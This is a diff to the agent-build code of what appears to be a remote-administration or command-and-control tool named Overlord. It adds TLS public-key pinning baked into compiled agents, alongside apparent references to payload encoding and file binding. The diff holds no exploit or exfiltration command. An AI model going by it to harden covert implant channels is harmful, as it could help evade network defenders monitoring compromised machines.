@@ -24,6 +24,12 @@ import { runSgn } from "./sgn-manager";
 import { resolveContainedPath } from "./upload-security";
 import { createIsolatedBuildEnv } from "./build-environment";
 import { cleanupMacosSdkUpload, extractAndValidateMacosSdk } from "./macos-sdk-manager";
+import { getActiveTlsSpkiPins } from "./tls-bootstrap";
+
+export function createAgentTlsPinsLdflag(pins: string[]): string {
+  if (pins.length === 0) return "";
+  return `-X overlord-client/cmd/agent/config.DefaultTLSSPKIPins=${pins.join(",")}`;
+}
 
 function isClientModuleDir(dir: string): boolean {
   return (
@@ -628,6 +634,16 @@ export async function startBuildProcess(
 
     const serverConfig = getConfig();
     const buildAgentToken = (serverConfig.auth.agentToken || "").trim();
+    const buildTlsSpkiPins = getActiveTlsSpkiPins();
+    if (
+      String(process.env.OVERLORD_TLS_OFFLOAD || "").toLowerCase() === "true" &&
+      buildTlsSpkiPins.length === 0
+    ) {
+      throw new Error(
+        "TLS offload requires OVERLORD_TLS_SPKI_PINS before building agents; " +
+        "pin the external HTTPS/WSS certificate public key",
+      );
+    }
 
     sendToStream({ type: "status", text: "Preparing build environment..." });
 
@@ -1203,6 +1219,22 @@ func runBoundFiles() {
         const serverFlag = `-X overlord-client/cmd/agent/config.DefaultServerURL=${config.serverUrl}`;
         ldflags = `${ldflags} ${serverFlag}`;
         sendToStream({ type: "output", text: `Server URL: ${config.serverUrl}\n`, level: "info" });
+      }
+
+      if (buildTlsSpkiPins.length > 0) {
+        const tlsPinsFlag = createAgentTlsPinsLdflag(buildTlsSpkiPins);
+        ldflags = `${ldflags} ${tlsPinsFlag}`;
+        sendToStream({
+          type: "output",
+          text: `TLS identity pinning: enabled (${buildTlsSpkiPins.length} trusted key${buildTlsSpkiPins.length === 1 ? "" : "s"})\n`,
+          level: "info",
+        });
+      } else {
+        sendToStream({
+          type: "output",
+          text: "WARNING: No TLS SPKI pin is available. Configure OVERLORD_TLS_SPKI_PINS when TLS is terminated externally.\n",
+          level: "warn",
+        });
       }
 
       if (config.rawServerList) {
